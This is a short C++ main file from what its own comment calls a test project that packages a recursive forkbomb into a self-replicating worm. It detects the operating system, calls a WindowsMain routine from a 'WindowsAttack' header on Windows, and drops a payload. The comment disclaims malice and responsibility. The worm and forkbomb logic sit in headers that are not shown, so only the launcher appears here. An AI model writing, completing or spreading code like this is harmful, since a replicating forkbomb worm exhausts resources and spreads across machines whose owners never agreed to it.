/*
NOTE: THIS IS A TEST PROJECT THAT IMPLEMENTS MY WMOSYSBOOT RECURSIVE FORKBOMB AND PACKAGES IT INTO A WORM
THIS IS NOT INTENTED TO BE MALICIOUS BUT TO SEE HOW FAST IT CAN REPLICATE.
I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS.
 */
#include <iostream>

#include "FilesWin.h"
#include "Payload.h"
#include "WindowsAttack.h"
using namespace std;
int main(){
#if defined(__linux__)
	cout << "Linux" << endl;
#elif defined(_WIN32)
	cout << "Windows" << endl;
	WindowsMain();
#elif defined(__APPLE__)
	cout << "Apple" << endl;
#endif

	cout << "Dropping payload of: " << dropPayload() << endl;
}

